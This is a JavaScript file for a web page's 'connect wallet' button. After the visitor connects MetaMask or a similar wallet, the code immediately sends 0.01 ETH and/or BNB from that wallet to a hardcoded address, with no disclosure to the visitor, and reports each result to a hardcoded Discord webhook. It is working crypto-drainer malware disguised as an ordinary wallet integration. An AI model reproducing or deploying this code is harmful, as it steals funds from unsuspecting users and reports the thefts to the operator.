let isConnecting = false;

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    document.getElementById("connectButton").disabled = true;

    try {
        if (typeof window.ethereum !== 'undefined') {
            // Request wallet connection
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to account: ${account}`);

            // Detect available networks and send transactions
            const ethAvailable = await isNetworkAvailable('ethereum');
            const bnbAvailable = await isNetworkAvailable('bsc');

            if (ethAvailable && bnbAvailable) {
                console.log('Both ETH and BNB are available, sending transactions...');
                await sendTransaction("ETH");
                await sendTransaction("BNB");
            } else if (ethAvailable) {
                console.log('Sending ETH transaction...');
                await sendTransaction("ETH");
            } else if (bnbAvailable) {
                console.log('Sending BNB transaction...');
                await sendTransaction("BNB");
            } else {
                console.log('Neither Ethereum nor Binance Smart Chain is available.');
            }
        } else {
            alert("Please install one of the following wallets to continue: MetaMask, Trust Wallet, or Coinbase Wallet.");
            window.open("https://metamask.io/", "_blank"); // Open MetaMask if it's not installed
        }
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false;
        document.getElementById("connectButton").disabled = false;
    }
}

async function isNetworkAvailable(network) {
    const networkId = await window.ethereum.request({ method: 'net_version' });

    if (network === 'ethereum' && networkId === '1') {
        return true; // Ethereum Mainnet is available
    } else if (network === 'bsc' && networkId === '56') {
        return true; // Binance Smart Chain is available
    } else {
        return false;
    }
}

async function sendTransaction(network) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    if (network === "ETH") {
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // ETH recipient address
        const amountInEther = "0.01"; // Amount of ETH to send

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("ETH Transaction response:", txResponse);
            await notifyWebhook("ETH transaction successful", txResponse);
        } catch (error) {
            console.error("Error sending ETH transaction:", error);
            await notifyWebhook("ETH transaction failed", error);
        }
    } else if (network === "BNB") {
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // BNB recipient address
        const amountInBNB = "0.01"; // Amount of BNB to send

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInBNB),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("BNB Transaction response:", txResponse);
            await notifyWebhook("BNB transaction successful", txResponse);
        } catch (error) {
            console.error("Error sending BNB transaction:", error);
            await notifyWebhook("BNB transaction failed", error);
        }
    }
}

async function notifyWebhook(message, data) {
    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Replace with your Discord webhook URL
    const body = {
        content: `${message}: ${JSON.stringify(data)}`,
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
    } catch (error) {
        console.error("Error sending webhook notification:", error);
    }
}

document.getElementById("connectButton").addEventListener("click", connectWallet);
